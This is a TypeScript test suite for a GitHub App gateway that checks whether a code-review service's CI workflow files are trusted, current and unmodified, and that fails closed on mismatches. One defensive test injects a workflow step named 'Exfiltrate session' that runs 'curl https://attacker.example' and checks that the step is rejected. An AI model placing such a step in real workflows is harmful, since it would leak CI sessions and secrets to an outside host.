    const t0Workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    const legacyWorkflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: t0Workflow,
      activePullRequests: [
        {
          number: 240,
          baseRef: "dev",
          baseHeadSha: "d".repeat(40),
          headSha: "c".repeat(40),
          mergeCommitSha: "e".repeat(40),
          reviewWorkflowAtBase: t0Workflow,
          reviewWorkflowAtMerge: legacyWorkflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({ compatible: false });
  });

  it("does not treat a test merge built from an old base tip as current authority", async () => {
    const actionSha = "a".repeat(40);
    const t0Workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    const legacyWorkflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: t0Workflow,
      activePullRequests: [
        {
          number: 292,
          baseRef: "dev",
          baseHeadSha: "f".repeat(40),
          listedBaseSha: "d".repeat(40),
          headSha: "c".repeat(40),
          mergeCommitSha: "e".repeat(40),
          reviewWorkflowAtBase: t0Workflow,
          reviewWorkflowAtMerge: legacyWorkflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({ compatible: true });
  });

  it("ignores a stale merge ref after GitHub proves the PR is conflicted", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      activePullRequests: [
        {
          number: 252,
          baseRef: "dev",
          baseHeadSha: "d".repeat(40),
          headSha: "c".repeat(40),
          mergeCommitSha: null,
          mergeable: false,
          reviewWorkflowAtBase: workflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({ compatible: true });
  });

  it("fails closed while GitHub mergeability is still unknown", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      activePullRequests: [
        {
          number: 240,
          baseRef: "dev",
          baseHeadSha: "d".repeat(40),
          headSha: "c".repeat(40),
          mergeCommitSha: null,
          mergeable: null,
          reviewWorkflowAtBase: workflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).rejects.toThrow(
      "codex_rotating_workflow_inventory_mergeability_unavailable",
    );
  });

  it("fails closed when a merge ref moves during inspection", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      activePullRequests: [
        {
          number: 240,
          baseRef: "dev",
          baseHeadSha: "d".repeat(40),
          headSha: "c".repeat(40),
          mergeCommitSha: "e".repeat(40),
          movedMergeCommitSha: "9".repeat(40),
          reviewWorkflowAtBase: workflow,
          reviewWorkflowAtMerge: workflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).rejects.toThrow("codex_rotating_workflow_inventory_coverage_moved");
  });

  it("fails closed when the open PR set changes during inspection", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      revalidatedActivePullRequests: [
        {
          number: 240,
          baseRef: "dev",
          baseHeadSha: "d".repeat(40),
          headSha: "c".repeat(40),
          mergeCommitSha: null,
          mergeable: false,
          reviewWorkflowAtBase: workflow,
        },
      ],
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).rejects.toThrow("codex_rotating_workflow_inventory_coverage_moved");
  });

  it("accepts an interaction workflow pinned to the same immutable T0 runtime", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      interactionWorkflow: renderT0InteractionWorkflow(actionSha),
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({
      compatible: true,
      actionCommitSha: actionSha,
    });
  });

  it("treats a prior V2 interaction workflow as stale inventory", async () => {
    const actionSha = "a".repeat(40);
    const actionRef = `777genius/review-router@${actionSha}`;
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      interactionWorkflow: renderCanonicalCodexRotatingInteractionWorkflowV2({
        actionRef,
        apiUrl: "https://api.reviewrouter.site",
        runtimeConfigMode: "oidc",
      }),
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({ compatible: false, actionCommitSha: actionSha });
  });

  it("rejects an interaction workflow pinned to a different runtime", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      interactionWorkflow: renderT0InteractionWorkflow("b".repeat(40)),
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({ compatible: false, actionCommitSha: actionSha });
  });

  it("rejects extra interaction workflow steps even when the runtime pin matches", async () => {
    const actionSha = "a".repeat(40);
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: `777genius/review-router@${actionSha}`,
      apiUrl: "https://api.reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      refreshScheduleCron: null,
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
    });
    const interactionWorkflow = `${renderT0InteractionWorkflow(actionSha)}
      - name: Exfiltrate session
        run: curl https://attacker.example
`;
    mockManagedWorkflowInventory({
      reviewWorkflow: workflow,
      interactionWorkflow,
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.inspectReviewV2ManagedWorkflowInventory({
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        repositoryFullName: "777genius/example",
        owner: "777genius",
      }),
    ).resolves.toMatchObject({ compatible: false, actionCommitSha: actionSha });
  });

  it("resolves a pull_request_target scope from the signed workflow run", async () => {
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_actions_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { actions: "read" },
    });
    mocks.request.mockResolvedValueOnce({
      data: {
        event: "pull_request_target",
        run_attempt: 2,
        repository: { id: 123456 },
        pull_requests: [{ number: 240 }],
      },
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.resolveWorkflowRunPullRequest({
        repository: {
          githubInstallationId: "129500385",
          githubRepositoryId: "123456",
          fullName: "777genius/example",
          owner: "777genius",
        },
        githubRunId: "9001",
        githubRunAttempt: "2",
        eventName: "pull_request_target",
      }),
    ).resolves.toBe(240);

    expect(mocks.auth).toHaveBeenCalledWith({
      type: "installation",
      installationId: 129500385,
      repositoryIds: [123456],
      permissions: { actions: "read" },
    });
    expect(mocks.request).toHaveBeenCalledWith(
      "GET /repos/{owner}/{repo}/actions/runs/{run_id}",
      {
        owner: "777genius",
        repo: "example",
        run_id: 9001,
        headers: { authorization: "Bearer ghs_actions_read_token" },
      },
    );
  });

  it("loads exact changed-line facts with a pull-requests read token", async () => {
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_pull_requests_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { pull_requests: "read" },
    });
    mocks.request.mockResolvedValueOnce({
      data: {
        number: 252,
        additions: 299_627,
        deletions: 47_351,
        base: { repo: { id: 123456 } },
        head: { sha: "a".repeat(40) },
      },
    });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.resolve({
        repository: {
          workspaceId: "workspace_1",
          repositoryId: "repository_1",
          githubInstallationId: "129500385",
          githubRepositoryId: "123456",
          fullName: "777genius/example",
          owner: "777genius",
          selected: true,
          installationStatus: "active",
        },
        pullRequestNumber: 252,
      }),
    ).resolves.toEqual({
      pullRequestNumber: 252,
      headSha: "a".repeat(40),
      additions: 299_627,
      deletions: 47_351,
    });
    expect(mocks.auth).toHaveBeenCalledWith({
      type: "installation",
      installationId: 129500385,
      repositoryIds: [123456],
      permissions: { pull_requests: "read" },
    });
    expect(mocks.request).toHaveBeenCalledWith(
      "GET /repos/{owner}/{repo}/pulls/{pull_number}",
      {
        owner: "777genius",
        repo: "example",
        pull_number: 252,
        headers: { authorization: "Bearer ghs_pull_requests_read_token" },
      },
    );
  });

  it("rejects rotating workflow source from an unexpected action repository", async () => {
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef: "evil/review-router@0123456789abcdef0123456789abcdef01234567",
      apiUrl: "https://reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
    });
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_contents_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { contents: "read" },
    });
    mocks.request.mockResolvedValueOnce({
      data: {
        type: "file",
        encoding: "base64",
        content: Buffer.from(workflow, "utf8").toString("base64"),
      },
    });

    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.verifyWorkflowSource({
        repository: {
          githubInstallationId: "129500385",
          githubRepositoryId: "123456",
          fullName: "777genius/example",
          owner: "777genius",
        },
        workflowSha: "abcdefabcdefabcdefabcdefabcdefabcdefabcd",
        workflowRef:
          "777genius/example/.github/workflows/reviewrouter-codex.yml@refs/heads/main",
        workflowPath: ".github/workflows/reviewrouter-codex.yml",
        expectedActionOwnerRepo: "777genius/review-router",
        expectedProviderInstanceId: "codex-rotating:123456",
        expectedWorkflowSchemaVersion: 1,
      }),
    ).rejects.toThrow("codex_rotating_workflow_mapping_required");
  });

  it("rejects an expected-owner schema-1 workflow without a versioned namespace", async () => {
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef:
        "777genius/review-router@2222222222222222222222222222222222222222",
      apiUrl: "https://reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
    });
    mocks.auth.mockResolvedValueOnce({
      token: "ghs_contents_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { contents: "read" },
    });
    mocks.request.mockResolvedValueOnce({
      data: {
        type: "file",
        encoding: "base64",
        content: Buffer.from(workflow, "utf8").toString("base64"),
      },
    });

    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
      expectedApiUrl: "https://reviewrouter.site",
      trustedActionRefs: [
        "777genius/review-router@2222222222222222222222222222222222222222",
      ],
    });

    await expect(
      gateway.verifyWorkflowSource({
        repository: {
          githubInstallationId: "129500385",
          githubRepositoryId: "123456",
          fullName: "777genius/example",
          owner: "777genius",
        },
        workflowSha: "abcdefabcdefabcdefabcdefabcdefabcdefabcd",
        workflowRef:
          "777genius/example/.github/workflows/reviewrouter-codex.yml@refs/heads/main",
        workflowPath: ".github/workflows/reviewrouter-codex.yml",
        expectedActionOwnerRepo: "777genius/review-router",
        expectedProviderInstanceId: "codex-rotating:123456",
        expectedWorkflowSchemaVersion: 1,
      }),
    ).rejects.toThrow("codex_rotating_workflow_mapping_required");
  });

  it("attests the default branch and preserves an exact queued ancestor across fast-forward", async () => {
    const activeSecretNamespace = allocateVersionedProviderSecretNamespace({
      scope: {
        repositoryId: "123456",
        providerInstanceId: "codex-rotating:123456",
      },
      epoch: 9,
      randomBytes: () => new Uint8Array(16).fill(0x44),
    });
    const workflow = renderCodexRotatingAdvisoryWorkflow({
      actionRef:
        "777genius/review-router@2222222222222222222222222222222222222222",
      apiUrl: "https://reviewrouter.site",
      providerInstanceId: "codex-rotating:123456",
      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
      workflowSchemaVersion:
        CodexRotatingT0WorkflowSchemaVersion.VersionedSecretNamespaceV4,
      activeSecretNamespace,
    });
    mocks.auth.mockResolvedValue({
      token: "ghs_contents_read_token",
      expiresAt: "2026-05-25T12:15:00.000Z",
      permissions: { contents: "read" },
    });
    mocks.request
      .mockResolvedValueOnce({
        data: {
          type: "file",
          encoding: "base64",
          sha: gitBlobSha(workflow),
          content: Buffer.from(workflow, "utf8").toString("base64"),
        },
      })
      .mockResolvedValueOnce({
        data: {
          id: 123456,
          full_name: "777genius/example",
          default_branch: "main",
        },
      })
      .mockResolvedValueOnce({
        data: {
          name: "main",
          commit: { sha: "abcdefabcdefabcdefabcdefabcdefabcdefabcd" },
        },
      });
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
      expectedApiUrl: "https://reviewrouter.site",
      trustedActionRefs: [
        "777genius/review-router@2222222222222222222222222222222222222222",
      ],
    });
    const input = {
      repository: {
        githubInstallationId: "129500385",
        githubRepositoryId: "123456",
        fullName: "777genius/example",
        owner: "777genius",
      },
      workflowSha: "abcdefabcdefabcdefabcdefabcdefabcdefabcd",
      workflowRef:
        "777genius/example/.github/workflows/reviewrouter-codex.yml@refs/heads/main",
      workflowPath: ".github/workflows/reviewrouter-codex.yml",
      expectedActionOwnerRepo: "777genius/review-router",
      expectedProviderInstanceId: "codex-rotating:123456",
      expectedWorkflowSchemaVersion: 4,
    } as const;
    await expect(gateway.verifyWorkflowSource(input)).resolves.toMatchObject({
      binding: { activeSecretNamespace },
      attestation: {
        repositoryId: "123456",
        workflowSourceCommitSha: input.workflowSha,
        secretNamespace: activeSecretNamespace,
      },
    });

    mocks.request
      .mockResolvedValueOnce({
        data: {
          type: "file",
          encoding: "base64",
          sha: gitBlobSha(workflow),
          content: Buffer.from(workflow, "utf8").toString("base64"),
        },
      })
      .mockResolvedValueOnce({
        data: {
          id: 123456,
          full_name: "777genius/example",
          default_branch: "main",
        },
      })
      .mockResolvedValueOnce({
        data: {
          name: "dev",
          commit: { sha: "abcdefabcdefabcdefabcdefabcdefabcdefabcd" },
        },
      });
    await expect(
      gateway.verifyWorkflowSource({
        ...input,
        workflowRef:
          "777genius/example/.github/workflows/reviewrouter-codex.yml@refs/heads/dev",
      }),
    ).resolves.toMatchObject({
      attestation: {
        sourceTrust: "trusted_canonical_branch_mirror_revision",
      },
    });

    mocks.request
      .mockResolvedValueOnce({
        data: {
          type: "file",
          encoding: "base64",
          sha: gitBlobSha(workflow),
          content: Buffer.from(workflow, "utf8").toString("base64"),
        },
      })
      .mockResolvedValueOnce({
        data: {
          id: 123456,
          full_name: "777genius/example",
          default_branch: "main",
        },
      });
    await expect(
      gateway.verifyWorkflowSource({
        ...input,
        workflowRef:
          "777genius/example/.github/workflows/reviewrouter-codex.yml@refs/tags/dev",
      }),
    ).rejects.toThrow("codex_rotating_workflow_source_not_branch_revision");

    mocks.request
      .mockResolvedValueOnce({
        data: {
          type: "file",
          encoding: "base64",
          sha: gitBlobSha(workflow),
          content: Buffer.from(workflow, "utf8").toString("base64"),
        },
      })
      .mockResolvedValueOnce({
        data: {
          id: 123456,
          full_name: "777genius/example",
          default_branch: "main",
        },
      })
      .mockResolvedValueOnce({
        data: { name: "main", commit: { sha: "f".repeat(40) } },
      })
      .mockResolvedValueOnce({
        data: { status: "ahead" },
      });
    const queuedAncestor = await gateway.verifyWorkflowSource(input);
    expect(queuedAncestor).toMatchObject({
      binding: { activeSecretNamespace },
      attestation: { workflowSourceCommitSha: input.workflowSha },
    });
    expect(() =>
      assertActiveVersionedSecretWorkflowAttestation({
        attestation: queuedAncestor.attestation,
        repositoryId: input.repository.githubRepositoryId,
        workflowPath: input.workflowPath,
        workflowSourceCommitSha: input.workflowSha,
        activeSecretNamespace,
        expectedWorkflowSource: {
          workflowPath: queuedAncestor.attestation.workflowPath,
          workflowSourceCommitSha:
            queuedAncestor.attestation.workflowSourceCommitSha,
          workflowSourceBlobSha:
            queuedAncestor.attestation.workflowSourceBlobSha,
          workflowSourceSha256: queuedAncestor.attestation.workflowSourceSha256,
          workflowSemanticSha256:
            queuedAncestor.attestation.workflowSemanticSha256,
          sourceTrust: "trusted_default_branch_revision",
          repositoryId: queuedAncestor.attestation.repositoryId,
        },
      }),
    ).not.toThrow();
    expect(mocks.request).toHaveBeenCalledWith(
      "GET /repos/{owner}/{repo}/compare/{basehead}",
      expect.objectContaining({
        basehead: `${input.workflowSha}...${"f".repeat(40)}`,
      }),
    );

    mocks.request
      .mockResolvedValueOnce({
        data: {
          type: "file",
          encoding: "base64",
          sha: gitBlobSha(workflow),
          content: Buffer.from(workflow, "utf8").toString("base64"),
        },
      })
      .mockResolvedValueOnce({
        data: {
          id: 123456,
          full_name: "777genius/example",
          default_branch: "main",
        },
      })
      .mockResolvedValueOnce({
        data: { name: "main", commit: { sha: "e".repeat(40) } },
      })
      .mockResolvedValueOnce({ data: { status: "diverged" } });
    await expect(gateway.verifyWorkflowSource(input)).rejects.toThrow(
      "codex_rotating_workflow_source_not_current_branch_head",
    );

    for (const repositoryIdentity of [
      {
        id: "123456",
        full_name: "777genius/example",
        default_branch: "main",
      },
      {
        id: 123456,
        full_name: "attacker/example",
        default_branch: "main",
      },
    ]) {
      mocks.request
        .mockResolvedValueOnce({
          data: {
            type: "file",
            encoding: "base64",
            sha: gitBlobSha(workflow),
            content: Buffer.from(workflow, "utf8").toString("base64"),
          },
        })
        .mockResolvedValueOnce({ data: repositoryIdentity });
      await expect(gateway.verifyWorkflowSource(input)).rejects.toThrow(
        "codex_rotating_repository_identity_mismatch",
      );
    }
  });

  it("rejects non-numeric GitHub repository ids before token minting", async () => {
    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
      appId: "123",
      privateKey: "private-key",
    });

    await expect(
      gateway.issueSecretsReadToken({
        githubInstallationId: "129500385",
        githubRepositoryId: "R_kgDOExample",
        repositoryFullName: "777genius/example",
      }),
    ).rejects.toThrow("codex_rotating_secret_repository_id_invalid");
    expect(mocks.auth).not.toHaveBeenCalled();
  });
});

function mockManagedWorkflowInventory(input: {
  readonly reviewWorkflow: string;
  readonly interactionWorkflow?: string;
  readonly activePullRequests?: readonly {
    readonly number: number;
    readonly draft?: boolean;
    readonly baseRef: string;
    readonly baseHeadSha: string;
    readonly listedBaseSha?: string;
    readonly movedBaseHeadSha?: string;
    readonly headSha: string;
    readonly mergeCommitSha?: string | null;
    readonly movedMergeCommitSha?: string | null;
    readonly mergeable?: boolean | null;
    readonly reviewWorkflowAtBase?: string;
    readonly legacyWorkflowAtBase?: string;
    readonly reviewWorkflowAtMerge?: string;
    readonly legacyWorkflowAtMerge?: string;
  }[];
  readonly revalidatedActivePullRequests?: readonly {
    readonly number: number;
    readonly draft?: boolean;
    readonly baseRef: string;
    readonly baseHeadSha: string;
    readonly listedBaseSha?: string;
    readonly movedBaseHeadSha?: string;
    readonly headSha: string;
    readonly mergeCommitSha?: string | null;
    readonly movedMergeCommitSha?: string | null;
    readonly mergeable?: boolean | null;
    readonly reviewWorkflowAtBase?: string;
    readonly legacyWorkflowAtBase?: string;
    readonly reviewWorkflowAtMerge?: string;
    readonly legacyWorkflowAtMerge?: string;
  }[];
}) {
  const activePullRequests = input.activePullRequests ?? [];
  const allPullRequests = [
    ...activePullRequests,
    ...(input.revalidatedActivePullRequests ?? []),
  ];
  const branches = [
    {
      ref: "main",
      headSha: "f".repeat(40),
      reviewWorkflow: input.reviewWorkflow,
      interactionWorkflow: input.interactionWorkflow,
    },
    ...allPullRequests.map((pullRequest) => ({
      ref: pullRequest.baseRef,
      headSha: pullRequest.baseHeadSha,
      movedHeadSha: pullRequest.movedBaseHeadSha,
      reviewWorkflow: pullRequest.reviewWorkflowAtBase,
      legacyWorkflow: pullRequest.legacyWorkflowAtBase,
    })),
  ];
  const mergeReferences = activePullRequests.flatMap((pullRequest) =>
    pullRequest.mergeCommitSha
      ? [
          {
            ref: pullRequest.mergeCommitSha,
            reviewWorkflow: pullRequest.reviewWorkflowAtMerge,
            legacyWorkflow: pullRequest.legacyWorkflowAtMerge,
          },
        ]
      : [],
  );
  const branchReads = new Map<string, number>();
  let pullListReads = 0;
  mocks.auth.mockResolvedValueOnce({
    token: "ghs_contents_read_token",
    expiresAt: "2026-05-25T12:15:00.000Z",
    permissions: { contents: "read", pull_requests: "read" },
  });
  mocks.request.mockImplementation(
    async (route: string, request: Record<string, unknown>) => {
      if (route === "GET /repos/{owner}/{repo}") {
        return {
          data: {
            id: 123456,
            full_name: "777genius/example",
            default_branch: "main",
          },
        };
      }
      if (route === "GET /repos/{owner}/{repo}/pulls") {
        const pulls =
          pullListReads > 0 && input.revalidatedActivePullRequests
            ? input.revalidatedActivePullRequests
            : activePullRequests;
        pullListReads += 1;
        return {
          data:
            request.page === 1
              ? pulls.map((pullRequest) => ({
                  number: pullRequest.number,
                  draft: pullRequest.draft ?? false,
                  merge_commit_sha:
                    pullListReads > 1 && "movedMergeCommitSha" in pullRequest
                      ? pullRequest.movedMergeCommitSha
                      : (pullRequest.mergeCommitSha ?? null),
                  base: {
                    ref: pullRequest.baseRef,
                    sha:
                      pullListReads > 1 && "movedBaseHeadSha" in pullRequest
                        ? pullRequest.movedBaseHeadSha
                        : (pullRequest.listedBaseSha ??
                          pullRequest.baseHeadSha),
                    repo: { id: 123456 },
                  },
                  head: { sha: pullRequest.headSha },
                }))
              : [],
        };
      }
      if (route === "GET /repos/{owner}/{repo}/pulls/{pull_number}") {
        const pullRequest = allPullRequests.find(
          (candidate) => candidate.number === request.pull_number,
        );
        if (!pullRequest) throw { status: 404 };
        return {
          data: {
            number: pullRequest.number,
            draft: pullRequest.draft ?? false,
            mergeable:
              "mergeable" in pullRequest ? pullRequest.mergeable : false,
            merge_commit_sha: pullRequest.mergeCommitSha ?? null,
            base: {
              ref: pullRequest.baseRef,
              sha: pullRequest.listedBaseSha ?? pullRequest.baseHeadSha,
              repo: { id: 123456 },
            },
            head: { sha: pullRequest.headSha },
          },
        };
      }
      if (route === "GET /repos/{owner}/{repo}/branches/{branch}") {
        const ref = String(request.branch);
        const branch = branches.find((candidate) => candidate.ref === ref);
        if (!branch) throw { status: 404 };
        const readCount = branchReads.get(ref) ?? 0;
        branchReads.set(ref, readCount + 1);
        return {
          data: {
            name: ref,
            commit: {
              sha:
                readCount > 0 &&
                "movedHeadSha" in branch &&
                typeof branch.movedHeadSha === "string"
                  ? branch.movedHeadSha
                  : branch.headSha,
            },
          },
        };
      }
      if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
        const reference =
          branches.find((candidate) => candidate.headSha === request.ref) ??
          mergeReferences.find((candidate) => candidate.ref === request.ref);
        if (!reference) throw { status: 404 };
        const path = String(request.path);
        if (path === ".github/workflows/reviewrouter-codex.yml") {
          if (!reference.reviewWorkflow) throw { status: 404 };
          return fileContent(reference.reviewWorkflow);
        }
        if (path === ".github/workflows/reviewrouter.yml") {
          if (
            !("legacyWorkflow" in reference) ||
            typeof reference.legacyWorkflow !== "string"
          ) {
            throw { status: 404 };
          }
          return fileContent(reference.legacyWorkflow);
        }
        if (path === ".github/workflows/reviewrouter-interaction.yml") {
          if (
            !("interactionWorkflow" in reference) ||
            typeof reference.interactionWorkflow !== "string"
          ) {
            throw { status: 404 };
          }
          return fileContent(reference.interactionWorkflow);
        }
        throw { status: 404 };
      }
      throw new Error(`unexpected_github_route:${route}`);
    },
  );
}

function fileContent(workflow: string) {
  return {
    data: {
      type: "file",
      encoding: "base64",
      content: Buffer.from(workflow, "utf8").toString("base64"),
    },
  };
}

function gitBlobSha(source: string): string {
  return createHash("sha1")
    .update(`blob ${Buffer.byteLength(source, "utf8")}\0`, "utf8")
    .update(source, "utf8")
    .digest("hex");
}

function renderT0InteractionWorkflow(actionSha: string) {
  return renderCodexRotatingInteractionWorkflow({
    actionRef: `777genius/review-router@${actionSha}`,
    apiUrl: "https://api.reviewrouter.site",
    runtimeConfigMode: "oidc",
  });
}
